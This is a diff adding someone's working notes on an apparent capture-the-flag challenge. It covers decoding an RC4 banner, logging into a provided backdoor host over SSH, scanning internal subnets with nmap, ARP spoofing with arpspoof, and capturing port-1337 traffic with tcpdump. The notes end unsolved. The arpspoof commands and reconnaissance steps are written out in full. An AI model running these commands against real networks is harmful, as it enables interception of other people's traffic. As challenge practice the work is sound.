@@ -1,0 +1,205 @@
+When I checked 3.126.154.76:80 I got:
+
+00000000  57 65 6c 63 6f 6d 65 21  20 79 6f 75 72 20 52 43   Welcome!  your RC
+00000010  34 20 6b 65 79 20 69 73  3a 20 63 73 61 2d 6d 69   4 key is : csa-mi
+00000020  74 6d 2d 6b 65 79 0a                               tm-key.
+00000027  01 3a a1 32 24 c1 4f 2c  41 82 ee 08 7d 80 1f 10   .:.2$.O, A...}...
+00000037  54 c9 92 a5 5f 1b ec 40  f3 db 3b 95 32 ea 38 f9   T..._..@ ..;.2.8.
+
+By using RC4 decryption online tool with key: 
+csa-mitm-key
+and message(in hex): 
+01 3a a1 32 24 c1 4f 2c 41 82 ee 08 7d 80 1f 10 54 c9 92 a5 5f 1b ec 40 f3 db 3b 95 32 ea 38 f9
+We get:
+Hi! what's the secret sequence?
+
+Website used:
+https://www.dcode.fr/rc4-cipher
+
+
+Some kind of RC4 key and then some text.
+
+I ssh to 3.126.154.76:
+    $ ssh csa@3.126.154.76 -p 2222
+
+shlomidomnenko@Shlomis-MacBook-Air CS-hAcked % ssh csa@3.126.154.76 -p 2222
+                 uuuuuuu
+             uu$$$$$$$$$$$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$"   "$$$"   "$$$$$$u
+       "$$$$"      u$u       $$$$"
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         "$$$$uu$$$   $$$uu$$$$"
+          "$$$$$$$"   "$$$$$$$"
+            u$$$$$$$u$$$$$$$u
+             u$"$"$"$"$"$"$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$$$$u$u$u$$$       u$$$$
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+ """      ""$$$$$$$$$$$uu ""$"""
+           uuuu ""$$$$$$$$$$uuu
+  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+  $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+     $$$"                         $$$$"
+----------------------------------------
+---------------CS-hAcked----------------
+----------------------------------------
+csa@3.126.154.76's password: 
+-bash: /usr/bin/groups: Permission denied
+-bash: /usr/bin/locale-check: Permission denied
+-bash: /usr/bin/mesg: Permission denied
+Great! let's go quick get the sequence before getting detected
+Goodluck!
+
+
+In /etc/hosts we have:
+    csa@2d9cadf1ebc0:/etc$ cat hosts
+    127.0.0.1       localhost
+    ::1     localhost ip6-localhost ip6-loopback
+    fe00::0 ip6-localnet
+    ff00::0 ip6-mcastprefix
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    192.168.112.2   2d9cadf1ebc0
+    172.16.238.3    2d9cadf1ebc0
+
+The current machine's IP is: 3.126.154.76
+So we have additional IPs: 
+192.168.112.2   2d9cadf1ebc0     - NMAP cant find open/closed ports but the host is up (nmap -Pn)
+172.16.238.3    2d9cadf1ebc0     - SAME
+
+
+I got stuck here.
+I think I need to reoginize my head.
+
+I got SSH into machine which is inside CSA-HACKED group.
+When I connected, it says 
+-bash: /usr/bin/groups: Permission denied
+-bash: /usr/bin/locale-check: Permission denied
+-bash: /usr/bin/mesg: Permission denied
+Great! let's go quick get the sequence before getting detected
+Goodluck!
+
+which means I need to find the sequence while using it
+the sequence should be posted to the website I wrote about above, with RC4 key
+
+I JUST FIGURE OUT FINNALY THAT NMAP COMMAND DOESNT REQUIRE PERMISSIONS! I CAN USE IT NOW
+
+192.168.112.2 -> ssh open (22)
+172.16.238.3 -> ssh open (22)
+
+But I can't ssh (from backdoor) because of permissions
+And I can't ssh with my mac maybe its behind some firewall or something or not connected directly to the internet.
+
+
+Nmap scan report for 172.16.238.1
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   filtered http
+2222/tcp filtered EtherNetIP-1
+
+Nmap scan report for 2d9cadf1ebc0 (172.16.238.3)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+I ALSO JUST FOUND OUT ARPSPOOF DOESNT REQUIRE PERMISSIONS !!
+
+I will try to target: 192.168.112.2 - couldnt
+I will try to target: 172.16.238.3 - couldnt
+
+Let's summurize IP:
+
+172.16.238.1 - 22(open, ssh), 80(filtered, http), 2222(filtered, EtherNetIP-1) - PROBABLY ROUTER
+172.16.238.2 - Nothing open
+172.16.238.3 - 22(open, ssh) (2d9cadf1ebc0)    <---- this is me?
+172.16.238.4 - Nothing open
+
+
+3.126.154.76 - 80(open, http), 443(closed, https), 2222(open, ssh) - THIS MACHINE BACKDOOR (2d9cadf1ebc0)
+
+
+Apperantly, the backdoor machine has 2 interfaces: eth0, and eth1
+command used: cat /proc/net/dev
+Finnaly something that works with eth1
+
+
+THIS WORKS:
+    $ arpspoof -i eth1 -t 172.16.238.1 172.16.238.3
+
+I think I need to get root access to the machine and arp spoof and view traffic with dsniff or something to get secret combination and then send it to the http server for flag.
+
+But how do I gain root access?
+
+I JUST FOUND OUT TCPDUMP DOESNT REQURE PERMISSIONS!!!!!!!! IT TOOK ME A LOT OF TIME TO FIND SOMETHING USEFUL FINNALY
+
+I need to be router (172.16.238.1) so I need to tell 172.16.238.2 (and 172.16.238.3 ?) that I am router using arpspoof
+    $ arpspoof -i eth1 -t 172.16.238.2 172.16.238.1
+I need to be user (172.16.238.2) so I need to tell 172.16.238.1 and 172.16.238.3 that I am user using arpspoof
+    $ arpspoof -i eth1 -t 172.16.238.1 172.16.238.2
+
+
+/sys/class/net/eth1 address = 02:42:ac:10:ee:03
+
+INTERESTING PCAPS:
+
+
+======================================================================
+
+    172.16.238.4.44926 > 172.16.238.2.1337: Flags [P.], cksum 0x3455 (incorrect -> 0x90fd), seq 0:6, ack 1, win 502, options [nop,nop,TS val 2659945348 ecr 3027296288], length 6
+0x0000:  4500 003a 2580 4000 3f06 e215 ac10 ee04  E..:%.@.?.......
+0x0010:  ac10 ee02 af7e 0539 9c38 445a c047 6425  .....~.9.8DZ.Gd%
+0x0020:  8018 01f6 3455 0000 0101 080a 9e8b 8b84  ....4U..........
+0x0030:  b470 e020 3e32 17f7 e110                 .p..>2....
+
+    172.16.238.4.44926 > 172.16.238.2.1337: Flags [P.], cksum 0x3457 (incorrect -> 0x9177), seq 13:21, ack 1, win 502, options [nop,nop,TS val 2659947350 ecr 3027298290], length 8
+0x0000:  4500 003c 2582 4000 4006 e111 ac10 ee04  E..<%.@.@.......
+0x0010:  ac10 ee02 af7e 0539 9c38 4467 c047 6425  .....~.9.8Dg.Gd%
+0x0020:  8018 01f6 3457 0000 0101 080a 9e8b 9356  ....4W.........V
+0x0030:  b470 e7f2 4bbd 1eeb c033 fc30            .p..K....3.0
+
+    172.16.238.4.44926 > 172.16.238.2.1337: Flags [P.], cksum 0x3457 (incorrect -> 0x9177), seq 13:21, ack 1, win 502, options [nop,nop,TS val 2659947350 ecr 3027298290], length 8
+0x0000:  45c0 0058 d813 0000 4001 6da8 ac10 ee03  E..X....@.m.....
+0x0010:  ac10 ee04 0501 f262 ac10 ee02 4500 003c  .......b....E..<
+0x0020:  2582 4000 3f06 e211 ac10 ee04 ac10 ee02  %.@.?...........
+0x0030:  af7e 0539 9c38 4467 c047 6425 8018 01f6  .~.9.8Dg.Gd%....
+0x0040:  3457 0000 0101 080a 9e8b 9356 b470 e7f2  4W.........V.p..
+0x0050:  4bbd 1eeb c033 fc30                      K....3.0
+
+    172.16.238.2.1337 > 172.16.238.4.44926: Flags [P.], cksum 0x347b (incorrect -> 0xb2ec), seq 1:45, ack 31, win 510, options [nop,nop,TS val 3027302295 ecr 2659948352], length 44
+0x0000:  4500 0060 4fdb 4000 4006 b694 ac10 ee02  E..`O.@.@.......
+0x0010:  ac10 ee04 0539 af7e c047 6425 9c38 4479  .....9.~.Gd%.8Dy
+0x0020:  8018 01fe 347b 0000 0101 080a b470 f797  ....4{.......p..
+0x0030:  9e8b 9740 ea02 6bbc be0b f219 e695 ec22  ...@..k........"
+0x0040:  a79b 384f 6c43 df2d b1f7 df12 67bf 7a34  ..8OlC.-....g.z4
+0x0050:  0991 0778 df09 d42d 5516 556b 3623 d5ec  ...x...-U.Uk6#..
+
+    172.16.238.2.1337 > 172.16.238.4.44926: Flags [P.], cksum 0x347b (incorrect -> 0xb2ec), seq 1:45, ack 31, win 510, options [nop,nop,TS val 3027302295 ecr 2659948352], length 44
+0x0000:  45c0 007c 324c 0000 4001 134e ac10 ee03  E..|2L..@..N....
+0x0010:  ac10 ee02 0501 13d6 ac10 ee04 4500 0060  ............E..`
+0x0020:  4fdb 4000 3f06 b794 ac10 ee02 ac10 ee04  O.@.?...........
+0x0030:  0539 af7e c047 6425 9c38 4479 8018 01fe  .9.~.Gd%.8Dy....
+0x0040:  347b 0000 0101 080a b470 f797 9e8b 9740  4{.......p.....@
+0x0050:  ea02 6bbc be0b f219 e695 ec22 a79b 384f  ..k........"..8O
+0x0060:  6c43 df2d b1f7 df12 67bf 7a34 0991 0778  lC.-....g.z4...x
+0x0070:  df09 d42d 5516 556b 3623 d5ec            ...-U.Uk6#..
+
+    172.16.238.2.1337 > 172.16.238.4.44926: Flags [P.], cksum 0x347b (incorrect -> 0xb2ec), seq 1:45, ack 31, win 510, options [nop,nop,TS val 3027302295 ecr 2659948352], length 44
+0x0000:  4500 0060 4fdb 4000 3f06 b794 ac10 ee02  E..`O.@.?.......
+0x0010:  ac10 ee04 0539 af7e c047 6425 9c38 4479  .....9.~.Gd%.8Dy
+0x0020:  8018 01fe 347b 0000 0101 080a b470 f797  ....4{.......p..
+0x0030:  9e8b 9740 ea02 6bbc be0b f219 e695 ec22  ...@..k........"
+0x0040:  a79b 384f 6c43 df2d b1f7 df12 67bf 7a34  ..8OlC.-....g.z4
+0x0050:  0991 0778 df09 d42d 5516 556b 3623 d5ec  ...x...-U.Uk6#..
+
+
+======================================================================
+
+They are using port 1337 for something. RC4 with key as above didn't work for anything.
